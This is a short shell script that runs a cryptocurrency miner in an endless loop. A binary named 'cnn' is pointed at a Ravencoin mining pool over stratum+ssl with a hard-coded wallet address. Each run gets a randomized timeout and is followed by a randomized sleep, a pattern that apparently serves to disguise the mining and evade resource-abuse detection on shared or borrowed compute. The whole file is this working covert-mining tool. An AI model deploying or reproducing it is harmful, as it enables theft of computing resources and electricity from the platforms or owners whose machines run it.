while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=600
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=140
	aaram=$(($w+$e))
	timeout -k 5 $c\s   ./cnn/cnn -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@us.ravenminer.com:13802 -U
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
